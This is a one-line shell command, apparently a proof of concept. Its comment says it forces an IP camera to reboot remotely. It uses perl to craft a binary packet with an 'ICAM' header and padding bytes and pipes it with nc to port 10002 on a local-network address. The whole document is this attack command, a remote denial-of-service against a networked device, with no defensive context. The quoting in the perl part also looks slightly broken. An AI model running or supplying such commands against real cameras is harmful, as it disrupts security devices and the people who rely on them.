# Force the camera to reboot remotely
perl -e '$cmd=pack("v", 242); $len=pack("v", 32); printf "ICAM" . "$cmd" . "\x0f"x9 . pack("C", 24) . "\x00"x3 . "\x0a"x40 . "\x0b"x4' . "\x0c"x55 | nc 192.168.0.201 10002 -q 0 | hd
